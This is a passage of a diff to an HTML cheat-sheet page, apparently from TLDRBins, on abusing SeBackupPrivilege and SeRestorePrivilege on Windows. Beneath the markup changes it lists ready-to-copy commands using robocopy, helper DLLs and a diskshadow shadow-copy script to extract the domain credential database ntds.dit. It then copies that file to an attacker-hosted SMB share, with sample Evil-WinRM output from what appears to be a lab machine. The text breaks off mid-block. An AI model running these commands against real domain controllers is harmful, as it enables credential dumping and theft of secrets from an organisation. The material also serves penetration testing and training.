@@ -1,193 +1,165 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
-    <meta charset="utf-8">
+<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
+<meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>SeBackupPrivilege/SeRestorePrivilege | TLDRBins</title>
-<meta name="robots" content='index, follow'>
+<meta name="robots" content="index, follow">
 <meta name="description" content="">
-<meta name="generator" content="hugo-index">
+<title>SeBackupPrivilege/SeRestorePrivilege | TLDRBins</title>
 <link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
-<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
-<script>
-    window.addEventListener('load', () => {
-        quicklink.listen();
-    });
-</script>
-
-  </head>
-  <body><header>
+</head>
+<body>
+<header>
   <h1>
     <a href="https://tldrbins.github.io/">
       <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
       <span>TLDRBins</span>
-    </a>
-    <span class="hl">/</span>
-    <a href="https://tldrbins.github.io/sebackupprivilege/">
-      <span>SeBackupPrivilege/SeRestorePrivilege</span>
-    </a>
-  </h1>
-  <div class="js-toggle-wrapper">
-    <div class="js-toggle">
-        <div class="js-toggle-track">
-            <div class="js-toggle-track-check">
-                <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
-            <div class="js-toggle-track-x">
-                <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
+    </a><span class="hl"> / </span>
+    <a href="https://tldrbins.github.io/sebackupprivilege/"><span>SeBackupPrivilege/SeRestorePrivilege</span></a></h1>
+  <div class="theme-toggle-wrapper">
+    <div class="theme-toggle">
+      <div class="theme-toggle-track">
+        <div class="theme-toggle-track-dark">
+          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
         </div>
-        <div class="js-toggle-thumb"></div>
-        <input class="js-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+        <div class="theme-toggle-track-light">
+          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+      </div>
+      <div class="theme-toggle-thumb"></div>
+      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
     </div>
-</div>
-    
-<style>
- 
+  </div>
+  <style>
+  .theme-toggle-wrapper, .theme-toggle {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      box-sizing: border-box;
+  }
 
- 
-.js-toggle-wrapper, .js-toggle {
-    margin: 0;
-    padding: 0;
-    border: 0;
-    box-sizing: border-box;
-}
+  .theme-toggle-wrapper {
+      display: table;
+      float: right;
+      margin-left: auto;
+  }
 
-.js-toggle-wrapper {
-    display: table;
-    float: right;
-    margin-left: auto;
-}
+  .theme-toggle {
+      touch-action: pan-x;
+      display: inline-block;
+      position: relative;
+      cursor: pointer;
+      background-color: transparent;
+      user-select: none;
+  }
 
-.js-toggle {
-    touch-action: pan-x;
-    display: inline-block;
-    position: relative;
-    cursor: pointer;
-    background-color: transparent;
-    user-select: none;
-}
+  .theme-toggle-screenreader-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      padding: 0;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+  }
 
-.js-toggle-screenreader-only {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    margin: -1px;
-    padding: 0;
-    overflow: hidden;
-    clip: rect(0, 0, 0, 0);
-}
+  .theme-toggle-track {
+      width: 50px;
+      height: 24px;
+      border-radius: 30px;
+      background-color: hsl(223, 61%, 44%);
+      transition: background-color 0.2s ease;
+  }
 
-.js-toggle-track {
-    width: 50px;
-    height: 24px;
-    border-radius: 30px;
-    background-color: hsl(223, 61%, 44%);
-    transition: background-color 0.2s ease;
-}
+  .theme-toggle-track-dark,
+  .theme-toggle-track-light {
+      position: absolute;
+      width: 17px;
+      height: 17px;
+      top: 50%;
+      transform: translateY(-50%);
+      transition: opacity 0.25s ease;
+  }
 
-.js-toggle-track-check,
-.js-toggle-track-x {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    top: 50%;
-    transform: translateY(-50%);
-    transition: opacity 0.25s ease;
-}
+  .theme-toggle-track-dark {
+      left: 5px;
+      opacity: 0;
+  }
 
-.js-toggle-track-check {
-    left: 5px;
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track-dark {
+      opacity: 1;
+  }
 
-.js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-}
+  .theme-toggle-track-light {
+      right: 5px;
+      opacity: 1;
+  }
 
-.js-toggle-track-x {
-    right: 5px;
-    opacity: 1;
-}
+  .theme-toggle--checked .theme-toggle-track-light {
+      opacity: 0;
+  }
 
-.js-toggle--checked .js-toggle-track-x {
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track {
+      background-color: hsl(222, 14%, 7%);
+  }
 
-.js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-}
+  .theme-toggle-thumb {
+      position: absolute;
+      top: 1px;
+      left: 1px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background-color: #fafafa;
+      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+  }
 
-.js-toggle-thumb {
-    position: absolute;
-    top: 1px;
-    left: 1px;
-    width: 22px;
-    height: 22px;
-    border-radius: 50%;
-    background-color: #fafafa;
-    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
-}
+  .theme-toggle--checked .theme-toggle-thumb {
+      transform: translateX(26px);
+  }
+  </style>
+  <script>
+      const body = document.body;
+      const themeSwitcher = document.querySelector('.theme-toggle');      
 
-.js-toggle--checked .js-toggle-thumb {
-    transform: translateX(26px);
-}
-</style>
+      themeSwitcher.addEventListener('click', () => {
+          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
+          body.classList.toggle('dark-mode', isDarkMode);
+          if (isDarkMode) {
+              localStorage.setItem('darkMode', 'true');
+          } else {
+              localStorage.removeItem('darkMode');
+          }
+      });      
 
-<script>
-    var body = document.body;
-    var switcher = document.getElementsByClassName('js-toggle')[0];
-
-    
-    switcher.addEventListener("click", function() {
-        this.classList.toggle('js-toggle--checked');
-        
-        if (this.classList.contains('js-toggle--checked')) {
-            body.classList.add('dark-mode');
-            
-            localStorage.setItem('darkMode', 'true');
-        } else {
-            body.classList.remove('dark-mode');
-            setTimeout(function() {
-                localStorage.removeItem('darkMode');
-            }, 100);
-        }
-    })
-
-    
-    if (localStorage.getItem('darkMode')) {
-        
-        switcher.classList.add('js-toggle--checked');
-        body.classList.add('dark-mode');
-    }
-</script>
+      if (localStorage.getItem('darkMode')) {
+          themeSwitcher.classList.add('theme-toggle--checked');
+          body.classList.add('dark-mode');
+      }
+  </script>
   <p class="desc"></p>
 </header>
-<div class="main">
-
+<main>
 <ul class="tagsList single">
-  
   <li><a href="https://tldrbins.github.io/@credential-dumping/">Credential Dumping</a></li>
-  
   <li><a href="https://tldrbins.github.io/@file-system/">File System</a></li>
-  
   <li><a href="https://tldrbins.github.io/@sebackupprivilege/">SeBackupPrivilege</a></li>
-  
   <li><a href="https://tldrbins.github.io/@serestoreprivilege/">SeRestorePrivilege</a></li>
-  
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
-  
   <li><a href="https://tldrbins.github.io/@backup-operators/">Backup Operators</a></li>
-  
   <li><a href="https://tldrbins.github.io/@diskshadow/">Diskshadow</a></li>
-  
 </ul>
 <hr>
 <div class="content">
+  <div class="tips">
+  <p><strong>Usage Tips:</strong></p>
+  <ul>
+    <li>Click inside a code block to copy (excludes comments).</li>
+    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
+    <li>Click outside to collapse all examples.</li>
+  </ul>
+</div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;">
-	</form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DEST_DIR">DEST DIR: </label><input type="text" name="DEST_DIR"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="LOCAL_IP">LOCAL IP: </label><input type="text" name="LOCAL_IP"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="SID">SID: </label><input type="text" name="SID"></div><div class="input-group"><label for="TARGET_COMPUTER">TARGET COMPUTER: </label><input type="text" name="TARGET_COMPUTER"></div><div class="input-group"><label for="TARGET_DIR_PATH">TARGET DIR PATH: </label><input type="text" name="TARGET_DIR_PATH"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="TARGET_FILE_PATH">TARGET FILE PATH: </label><input type="text" name="TARGET_FILE_PATH"></div><div class="input-group"><label for="TARGET_FILE">TARGET FILE: </label><input type="text" name="TARGET_FILE"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Params Form</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -195,7 +167,6 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-
 <style>
 #dynamicFormContainer {
 	width: 100%;
@@ -327,34 +298,42 @@ body.dark-mode #dynamicFormContainer button:hover {
 }
 </style>
   <h3 id="abuse-1-robocopy">Abuse #1: Robocopy</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example
-</span></span><span class="line"><span class="cl"><span class="go">robocopy /b &lt;TARGET_DIR_PATH&gt; &lt;DEST_DIR&gt; &lt;TARGET_FILE&gt;
-</span></span></span></code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example
+</span></span><span class="line"><span class="cl"><span class="go">robocopy /b <span class="o">&lt;TARGET_DIR_PATH&gt;</span> <span class="o">&lt;DEST_DIR&gt;</span> <span class="o">&lt;TARGET_FILE&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><hr>
 <h3 id="abuse-2-helper-dlls">Abuse #2: Helper dlls</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\SeBackupPrivilegeCmdLets.dll
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\SeBackupPrivilegeUtils.dll
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege &#39;&lt;TARGET_FILE_PATH&gt;&#39; &#39;C:\ProgramData\&lt;TARGET_FILE&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\SeBackupPrivilegeCmdLets.dll
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\SeBackupPrivilegeUtils.dll
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege '<span class="o">&lt;TARGET_FILE_PATH&gt;</span>' 'C:\ProgramData\<span class="o">&lt;TARGET_FILE&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example
 </span></span><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true">SeBackupPrivilegeUtils.dll</a></em></small>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true">SeBackupPrivilegeUtils.dll</a></em></small>
 <br>
 <small><em>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true">SeBackupPrivilegeCmdLets.dll</a></em></small></p>
 <hr>
 <h3 id="abuse-3-diskshadow">Abuse #3: Diskshadow</h3>
 <h4 id="1-create-a-dsh-file">1. Create a .dsh File</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set context persistent nowriters
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set context persistent nowriters
 </span></span></span><span class="line"><span class="cl"><span class="go">set metadata C:\ProgramData\test.cab
 </span></span></span><span class="line"><span class="cl"><span class="go">set verbose on
 </span></span></span><span class="line"><span class="cl"><span class="go">add volume c: alias test
 </span></span></span><span class="line"><span class="cl"><span class="go">create
 </span></span></span><span class="line"><span class="cl"><span class="go">expose %test% x:
-</span></span></span></code></pre></div><br>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Convert to dos format
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><br>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Convert to dos format
 </span></span><span class="line"><span class="cl"><span class="go">unix2dos vss.dsh
-</span></span></span></code></pre></div><h4 id="2-run-vssdsh">2. Run vss.dsh</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Upload and run
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="2-run-vssdsh">2. Run vss.dsh</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Upload and run
 </span></span><span class="line"><span class="cl"><span class="go">diskshadow /s C:\ProgramData\vss.dsh
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; diskshadow /s C:\ProgramData\vss.dsh
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; diskshadow /s C:\ProgramData\vss.dsh
 </span></span></span><span class="line"><span class="cl"><span class="go">Microsoft DiskShadow version 1.0
 </span></span></span><span class="line"><span class="cl"><span class="go">Copyright (C) 2013 Microsoft Corporation
 </span></span></span><span class="line"><span class="cl"><span class="go">On computer:  DC01,  9/24/2024 5:54:17 PM
@@ -389,26 +368,31 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">-&gt; %test% = {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491}
 </span></span></span><span class="line"><span class="cl"><span class="go">The shadow copy was successfully exposed as x:\.
 </span></span></span><span class="line"><span class="cl"><span class="go">-&gt;
-</span></span></span></code></pre></div><h4 id="3-host-a-smb-server-in-linux">3. Host a SMB Server (In Linux)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-smbserver share . -smb2support
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-smbserver share . -smb2support                                  
+</span></span></span></div></pre></div><h4 id="3-host-a-smb-server-in-linux">3. Host a SMB Server (In Linux)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-smbserver share . -smb2support
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> impacket-smbserver share . -smb2support                                  
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Config file parsed
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
 </span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
-</span></span></span></code></pre></div><h4 id="4-copy-to-local-linux">4. Copy to Local Linux</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">net use \\&lt;LOCAL_IP&gt;\share
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; net use \\10.10.14.31\share
+</span></span></span></div></pre></div><h4 id="4-copy-to-local-linux">4. Copy to Local Linux</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">net use \\<span class="o">&lt;LOCAL_IP&gt;</span>\share
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; net use \\10.10.14.31\share
 </span></span></span><span class="line"><span class="cl"><span class="go">The command completed successfully.
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\&lt;LOCAL_IP&gt;\share\ntds.dit
